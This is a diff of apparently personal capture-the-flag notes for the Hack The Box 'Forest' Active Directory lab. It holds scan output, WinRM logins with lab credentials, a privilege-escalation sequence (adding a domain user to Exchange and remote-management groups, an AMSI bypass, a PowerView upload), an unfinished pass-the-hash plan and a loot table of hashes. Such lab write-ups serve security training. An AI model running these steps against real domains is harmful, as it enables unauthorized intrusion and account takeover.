@@ -19,9 +19,41 @@ PORT     STATE SERVICE      VERSION
 593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
 636/tcp  open  tcpwrapped
 3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped     
+3269/tcp open  tcpwrapped    
+
+Network Distance: 2 hops                                                                                                                                                                                                                              [12/239]
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb-security-mode:
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2025-05-26T13:51:47-07:00
+| smb2-time: 
+|   date: 2025-05-26T20:51:46
+|_  start_date: 2025-05-26T20:39:23
+| smb2-security-mode: 
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m48s
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   7.13 ms 10.10.14.1
+2   9.51 ms 10.129.95.210
+
+
 ```
-the domain is `htb.local` 
+- The domain is `htb.local` 
+- The [FQND](https://en.wikipedia.org/wiki/Fully_qualified_domain_name) is `FOREST.htb.local`
 ## Ladapsearch Users Enum
 Check if the LDAP service allow anonymous authentication
 ```bash
@@ -100,14 +132,66 @@ nmap -p 5985 5986 10.129.211.144
 ![[Pasted image 20250526024319.png]]
 The 5985 is open this mean we can try to connect with `winrm` protocol using `crackmapexec`
 ```bash
-crackmapexec winrm 10.129.211.144 -u 'svc-alfresco' -p 's3rvice' -X 'whoami'
+crackmapexec winrm 10.129.211.144 -u 'svc-alfresco' -p 's3rvice' -X 'whoami /priv'
 ```
 
 ![[Pasted image 20250526024505.png]]
 
+connect to the host using `evil-winrm`
+```bash
+evil-winrm  -u svc-alfresco -p s3rvice --ip 10.129.211.144
+```
+
+## Privilege Escalation
+
+Run **bloodhunt** to view a map of the domain and look for a privilege escalation path.
+
+```bash
+bloodhount-python -d htb.local -u svc-alfresco -p s3rvice
+```
+
+Search for the `sv-alfresco` user and mark it as **owned**. We cans see the user is a member of `Account Operator gorup` and according with [microsoft documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators) the members of this group are allowed to create and modify users and add them to non-protected groups.
+
+![[Pasted image 20250528232042.png]]
+
+
+Click on `Quries` and select `Shorest Path to Hig Value targets`.
+
+![[Pasted image 20250528231428.png]]
+Go back to the WinRM shell and add a new user to` Exchange Windows Permissions` as well as
+the `Remote Management Users` (to have the winrm privilege) group.
+```bash
+net user gabbo abc123! /add /domain
+net gorup "Exchange Windows Permissions" gabbo /add
+net localgroup "Remote Management Users" gabbo /add
+```
+
+Now through the evil-winrm session set the `Bypass-4MSI` and upload the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1).
+
+```bash
+PS C:\Users\svc-alfresco\Documents> menu
+<SINP>
+PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
+PS C:\Users\svc-alfresco\Documents> upload /home/htb/powerview.ps1
+```
+
+TODO...
+add powerview.ps1
+privilege escalation wit DACL 
+join with administrat account with psexc in msfconsole
+set SMBDOMAIN htb.local
+set SMBPASS `<hash>`
+set SMBUSER administrator
 
 ## Loot
 
-| User                   | Password | Notes        |
-| ---------------------- | -------- | ------------ |
-| svc-alfresco@HTB.LOCAL | s3rvice  | Service User |
+| User                    | Password                                                          | Notes        |
+| ----------------------- | ----------------------------------------------------------------- | ------------ |
+| svc-alfresco@HTB.LOCAL  | s3rvice                                                           | Service User |
+| htb.local\Administrator | aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 |              |
+
+
+| Flag name | hash                             |
+| --------- | -------------------------------- |
+| user.txt  | 74a10803767e6a4e8c497303ec47ac14 |
+| root.txt  | 281c218ca00afda259de29fe09266655 |
